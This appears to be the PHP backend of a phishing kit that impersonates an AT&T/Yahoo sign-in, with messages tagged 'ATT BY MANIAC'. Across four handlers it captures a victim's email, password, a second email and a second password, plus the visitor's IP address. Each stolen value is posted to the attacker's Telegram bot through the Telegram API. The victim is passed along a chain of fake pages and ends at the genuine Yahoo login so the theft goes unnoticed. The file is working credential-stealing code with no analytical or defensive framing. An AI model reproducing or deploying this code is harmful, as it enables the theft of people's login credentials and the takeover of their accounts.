<?php
include_once("config.php");


function get_ip() {   
    if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
    }  
    else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
    }  
    else {  
        $ip = $_SERVER['REMOTE_ADDR'];  
    }  
    return $ip;  
} 

$ip = get_ip();

if (isset($_GET['Login'])) {

    $email = $_POST['email'];




    if (!empty($bot_token) && !empty($chat_id)) {




        
        $msg = "";
        $msg.="[--+🏦  ATT  BY MANIAC 🏦+--]\r\n";
        $msg.="[INFO]: Logins info is here.\r\n\r\n";
        $msg.="  USERNAME : <code>$email</code>\r\n";
        $msg.="---------------------------\r\n";
        $msg.="IP Address: $ip                  \r\n";
        $msg.="IP lookup: https://whatismyipaddress.com/ip/$ip \r\n";    

        $data = array(
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'html',
            'disable_web_page_preview' => true
        );
        $ch = curl_init('https://api.telegram.org/bot'.$bot_token.'/sendMessage');
        curl_setopt_array($ch, array(
            CURLOPT_HEADER => 0,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data
        ));
        curl_exec($ch);
        curl_close($ch);
    }

 header("Location: ../pass.html?sessionid=fp27y26d1197da19");
};
if (isset($_GET['pass'])) {

    $pass = $_POST['pass'];


    if (!empty($bot_token) && !empty($chat_id)) {


        
        $msg = "";
        $msg.="[--+🏦  ATT  BY MANIAC 🏦+--]\r\n";
        $msg.="[INFO]: Logins info is here.\r\n\r\n";
        $msg.="  Password : <code>$pass</code>\r\n";
        $msg.="---------------------------\r\n";
        $msg.="IP Address: $ip                  \r\n";
        $msg.="IP lookup: https://whatismyipaddress.com/ip/$ip \r\n";    

        $data = array(
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'html',
            'disable_web_page_preview' => true
        );
        $ch = curl_init('https://api.telegram.org/bot'.$bot_token.'/sendMessage');
        curl_setopt_array($ch, array(
            CURLOPT_HEADER => 0,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data
        ));
        curl_exec($ch);
        curl_close($ch);
    }

 header("Location:../email2.html?sessionid=fp27y26d1197da19");
};

if (isset($_GET['Login2'])) {

    $email2 = $_POST['email2'];


    if (!empty($bot_token) && !empty($chat_id)) {


        
        $msg = "";
        $msg.="[--+🏦  ATT  BY MANIAC 🏦+--]\r\n";
        $msg.="[INFO]: Logins info is here.\r\n\r\n";
        $msg.="  DUAL EMAIL : <code>$email2</code>\r\n";
        $msg.="---------------------------\r\n";
        $msg.="IP Address: $ip                  \r\n";
        $msg.="IP lookup: https://whatismyipaddress.com/ip/$ip \r\n";    

        $data = array(
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'html',
            'disable_web_page_preview' => true
        );
        $ch = curl_init('https://api.telegram.org/bot'.$bot_token.'/sendMessage');
        curl_setopt_array($ch, array(
            CURLOPT_HEADER => 0,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data
        ));
        curl_exec($ch);
        curl_close($ch);
    }

 header("Location:../pass2.html?sessionid=fp27y26d1197da19");
};
if (isset($_GET['pass2'])) {

    $pass = $_POST['pass2'];


    if (!empty($bot_token) && !empty($chat_id)) {


        
        $msg = "";
        $msg.="[--+🏦  ATT  BY MANIAC 🏦+--]\r\n";
        $msg.="[INFO]: Logins info is here.\r\n\r\n";
        $msg.="  Dual Password : <code>$pass</code>\r\n";
        $msg.="---------------------------\r\n";
        $msg.="IP Address: $ip                  \r\n";
        $msg.="IP lookup: https://whatismyipaddress.com/ip/$ip \r\n";    

        $data = array(
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'html',
            'disable_web_page_preview' => true
        );
        $ch = curl_init('https://api.telegram.org/bot'.$bot_token.'/sendMessage');
        curl_setopt_array($ch, array(
            CURLOPT_HEADER => 0,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data
        ));
        curl_exec($ch);
        curl_close($ch);
    }

 header("Location: https://login.yahoo.com/?.lang=en-US&src=homepage&partner=sbc");
};
	?>